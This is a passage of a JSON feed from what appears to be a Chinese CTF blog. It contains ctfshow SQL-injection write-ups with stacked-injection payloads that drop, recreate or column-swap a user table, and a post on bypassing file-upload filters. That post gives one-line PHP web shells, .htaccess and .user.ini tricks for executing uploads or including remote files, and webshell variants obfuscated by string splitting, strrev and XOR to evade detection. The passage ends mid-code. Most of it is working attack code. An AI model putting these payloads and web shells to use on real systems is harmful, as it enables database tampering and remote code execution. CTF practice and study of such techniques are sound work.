punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>}</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$<span class=\"token keyword\">row</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token operator\">=</span> $password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>{</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    $ret<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"登陆成功 flag is $flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>}</pre></td></tr></tbody></table></figure><p>在这一题中，与前面相比过滤了 update，不能更新，分号还是可以用，即堆叠注入还是可以用，所以不妨直接删除表，然后创建相同名字、字段的表，而数据自己设置</p>\n<p>因此 payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">;</span><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">insert</span> ctfshow_user<span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">value</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-198\"><a class=\"anchor\" href=\"#web-198\">#</a> web 198</h1>\n<p>相比于 197 而言，将 <code>drop</code>  和 <code>create</code>  过滤了</p>\n<p>这里可以使用交换列的方法 (前提是知道用户名是什么), 因为在交换了两列之后，查询语句就变为查询原来的 <code>pass</code>  列，而匹配的密码为原来的 <code>username</code>  列，而 <code>username</code>  是知道的，那么即可拿到 flag</p>\n<p>payload</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> ctfshow_user change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass2<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pass<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/592e5fba/",
            "url": "http://dpm12345.cn/posts/592e5fba/",
            "title": "文件上传",
            "date_published": "2022-10-04T14:14:40.000Z",
            "content_html": "<h1 id=\"情况\"><a class=\"anchor\" href=\"#情况\">#</a> 情况</h1>\n<ul>\n<li>\n<p>仅仅有前端验证，将前端代码删去一些</p>\n</li>\n<li>\n<p>后端仅验证后缀，改后缀</p>\n</li>\n<li>\n<p>后端仅验证 <code>content-type</code> ，改为可以上传的内容类型</p>\n</li>\n<li>\n<p>后端验证内容头，输入一个要求上传格式的内容头</p>\n</li>\n<li>\n<p>后端验证文件内容，如 <code>php</code>  过滤，可以使用短标签</p>\n</li>\n<li>\n<p>用户配置文件可以上传，采用 <code>auto_append_file=1.txt</code> ，(前提是有默认 <code>index.php</code>  可以打开) 然后在 <code>1.txt</code>  内容进行控制</p>\n</li>\n<li>\n<p>内容不允许有方括号，即普通的一句话木马不能上传，可以将方括号改为大括号</p>\n</li>\n<li>\n<p>一句话木马也可写成 <code>&lt;?php eval (array_pop ($_POST));?&gt;</code> , 同样也可</p>\n</li>\n<li>\n<p>过滤括号可以使用文件包含的，因为文件包含可以不写括号</p>\n</li>\n<li>\n<p>如果对某一字符串进行过滤，可以采用分开写的方式绕过，如日志包含过滤了 log，那么可以写成 <code>&lt;?=include '/var/l'.'og/nginx/access.l'.'og?&gt;</code></p>\n</li>\n<li>\n<p>空格过滤，可以使用换行代替（十六进制下用 <code>0d</code> ）</p>\n</li>\n<li>\n<p>过滤点号后，由于此时不能包含任何一个带点的文件 (如 log), 那么此时也可以使用远程 url 包含，先上传一个 <code>.user.ini</code>  自动加载没有点作为名字的文件，然后在该文件上传一个远程包含 url (其中 url 有一句话木马，该 url 为常地址不带点)，那么就可以 rce 了；另外也可以使用 session 包含竞争</p>\n</li>\n<li>\n<p>若无法上传出配置文件以外的文件 (即删除)，可以在配置文件中直接远程包含文件 (url)</p>\n</li>\n<li>\n<p>PNG 二次渲染</p>\n</li>\n<li>\n<p>jpg 二次渲染</p>\n</li>\n<li>\n<p>上传 <code>.htaccess</code>  文件，将某类型文件作为 php 文件读取</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>AddType application/x-httpd-php .png</pre></td></tr></tbody></table></figure><p>或者</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;FilesMatch \"png\"&gt; </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>SetHandler application/x-httpd-php </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>&lt;/FilesMatch&gt;</pre></td></tr></tbody></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;script language='php'&gt;eval($_POST[cmd]);&lt;/script&gt;</pre></td></tr></tbody></table></figure></li>\n<li>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p><strong>web 167-170</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"s#y#s#t#e#m\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$c</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1s'</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'ystem'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'metsys'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>更多的关于免杀</p>\n<ol>\n<li>\n<p>字符串拼接</p>\n</li>\n<li>\n<p>利用异或，使用其他符号构建字符串 如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//ABCDEFG</span></pre></td></tr></tbody></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span>  <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$b</span></span>)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//abcdefg</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//hijklmn</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//opqrst</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//uvwxyz</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$h</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'('</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">')'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'*'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'+'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'-'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'2'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'3'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'4'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'5'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'6'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'7'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span 